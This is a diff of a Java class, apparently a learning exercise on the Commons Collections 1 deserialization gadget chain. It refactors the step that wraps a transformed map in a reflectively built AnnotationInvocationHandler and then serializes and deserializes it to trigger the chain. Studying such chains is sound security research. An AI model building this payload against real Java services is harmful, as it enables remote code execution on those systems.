@@ -66,8 +66,8 @@ public class CC1 {
         Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
         annotationConstructor.setAccessible(true);
         Object obj = annotationConstructor.newInstance(Override.class, transformedMap);
-        serialize(obj);
-        unserialize("./exec.bin");
+        SerUtils.serialize(obj,"CC1.bin");
+        SerUtils.unserialize("CC1.bin");
 
     }
     public static void main(String[] args) throws Exception{
@@ -99,20 +99,7 @@ public class CC1 {
         Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
         annotationConstructor.setAccessible(true);
         Object obj = annotationConstructor.newInstance(Target.class, transformedMap);
-        serialize(obj);
-        unserialize("./exec.bin");
-    }
-
-
-    //序列化方法
-    public static void serialize(Object object) throws Exception {
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./exec.bin"));
-        oos.writeObject(object);
-    }
-
-    //反序列化方法
-    public static void unserialize(String filename) throws Exception {
-        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
-        objectInputStream.readObject();
+        SerUtils.serialize(obj,"CC1.bin");
+        SerUtils.unserialize("CC1.bin");
     }
 }
